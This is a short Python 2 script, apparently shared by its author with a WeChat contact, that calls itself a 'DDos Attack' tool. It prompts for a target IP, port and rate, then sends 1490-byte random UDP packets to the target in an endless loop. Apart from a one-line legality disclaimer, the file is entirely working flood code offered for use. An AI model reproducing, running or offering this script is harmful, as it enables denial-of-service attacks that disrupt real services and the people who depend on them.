# python2

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print " "
print "/---------------------------------------------------\ "
print "|   作者          :    wycnb666"
print "|   软件开源     |"
print "|    作者微信 :       AA1116366       |"
print "|   版本        : V1.0.0                        |"
print "\---------------------------------------------------/"
print " "
print " ---------[Do not use for illegal purposes]--------- "
print " "
ip = raw_input("网站ip     : ")
port = int(input("端口  : "))
sd = int(input("数值(1~1000) : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print "Sent %s packet to %s throught port:%d"%(sent,ip,port)
     time.sleep((1000-sd)/2000)
